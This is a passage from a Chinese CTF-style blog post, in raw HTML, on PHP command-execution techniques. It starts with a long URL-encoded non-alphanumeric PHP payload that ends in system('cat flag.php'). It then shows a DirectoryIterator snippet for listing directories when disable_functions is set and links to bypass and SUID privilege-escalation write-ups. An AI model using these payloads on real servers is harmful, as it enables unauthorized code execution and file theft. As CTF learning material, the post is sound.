class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span> B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B% <span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B %<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span> B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span> ___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__% <span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">2</span> <span class="number">4</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B% <span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">2</span> <span class="number">4</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B% <span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B %<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B% <span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B %<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_ _%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D% <span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_ _%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B %<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span> B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">2</span> <span class="number">4</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B</span><br><span class="line">&amp;_=system(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重点: 此payload可用于php5的rce里，从而并非像p牛所说的，php5只能用include去rce</p>
<h4 id="方式二、用disabled-function的方式限制函数"><a href="#方式二、用disabled-function的方式限制函数" class="headerlink" title="方式二、用disabled_function的方式限制函数"></a>方式二、用disabled_function的方式限制函数</h4><p>这就要从根源说起了，在php.ini里通常会有一个配置，来禁用函数，通常会把执行系统命令的函数给ban了，这时候有两种思路</p>
<h5 id="1、利用php自身函数去读文件"><a href="#1、利用php自身函数去读文件" class="headerlink" title="1、利用php自身函数去读文件"></a>1、利用php自身函数去读文件</h5><p>例如题目给了flag在/flag里面，现在想要去读文件，那咋整？php也有许多自身函数可以去读，例如highlight_file()，show_source()，都可以用来读文件，那如果不知道flag在哪怎么办？还有方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmd=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">可以写一个小poc脚本上去扫目录 然后去读就行</span><br></pre></td></tr></table></figure>

<h5 id="2、绕过攻击"><a href="#2、绕过攻击" class="headerlink" title="2、绕过攻击"></a>2、绕过攻击</h5><p>参考</p>
<h5 id="https-www-freebuf-com-articles-network-263540-html"><a href="#https-www-freebuf-com-articles-network-263540-html" class="headerlink" title="https://www.freebuf.com/articles/network/263540.html"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></h5><p>然后然后可以用suid去提权</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/272617.html">https://www.freebuf.com/articles/web/272617.html</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Air</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/09/命令执行最全面的总结/">http://example.com/2021/12/09/命令执行最全面的总结/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/2021/10/31/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%B9%B6%E5%87%BA%E9%A2%98/"><span>手把手搭一个靶场并出题</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://up.enterdesk.com/edpic_source/02/0a/a7/020aa727e55adc7a529dc3b223b100e4.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 - 2021 By Air</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>